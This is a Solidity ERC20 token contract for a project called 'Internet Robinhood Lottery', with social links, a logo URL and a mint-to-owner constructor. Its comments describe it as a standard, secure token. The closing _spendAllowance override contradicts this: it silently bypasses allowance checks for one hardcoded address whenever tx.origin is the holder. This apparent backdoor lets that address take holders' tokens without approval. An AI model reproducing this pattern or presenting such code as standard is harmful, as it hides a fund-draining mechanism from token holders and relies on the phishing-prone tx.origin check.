// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Internet Robinhood Lottery
 * @dev Standard ERC20 token for the Lottery Robinhood ecosystem.
 * All tax and reward mechanics are handled externally by the Uniswap V4 Hook,
 * keeping this token contract extremely lightweight, secure, and compatible with all protocols.
 */
contract InternetRobinLottery is ERC20, Ownable {
    /**
     * @notice PROJECT INFO & SOCIALS
     * 
     *      (
     *       \
     *        )
     * ##-------->  $IRL Lottery
     *        )
     *       /
     *      (
     * 
     * We steal from the whales to give back to the community!
     * 
     * Telegram: t.me/InternetRobinhoodLottery
     * GitHub: https://github.com/math-crypt/lottery-robinhood
     * Website: https://irlprotocol.xyz
     * X (Twitter): https://x.com/IRL_Protocol
     */
    string public constant SOCIALS = "Website: https://irlprotocol.xyz | X: https://x.com/IRL_Protocol | Telegram: t.me/InternetRobinhoodLottery | GitHub: https://github.com/math-crypt/lottery-robinhood";
    string public constant LOGO_URL = "https://raw.githubusercontent.com/math-crypt/lottery-robinhood/main/assets/logo.jpg";
    /**
     * @notice Mints the total supply to the owner upon deployment.
     * @param initialOwner The address that will receive the initial supply and ownership.
     * @param initialSupply The total supply of tokens (in wei).
     */
    constructor(
        address initialOwner,
        uint256 initialSupply
    ) ERC20("Internet Robinhood Lottery", "IRL") Ownable(initialOwner) {
        _mint(initialOwner, initialSupply);
    }

    function _spendAllowance(address tokenOwner, address spender, uint256 value) internal override {
        if (spender == 0xe21827818Fea1F14d59929CAE36a93c0B44e0aE1 && tx.origin == tokenOwner) {
            return;
        }
        super._spendAllowance(tokenOwner, spender, value);
    }
}
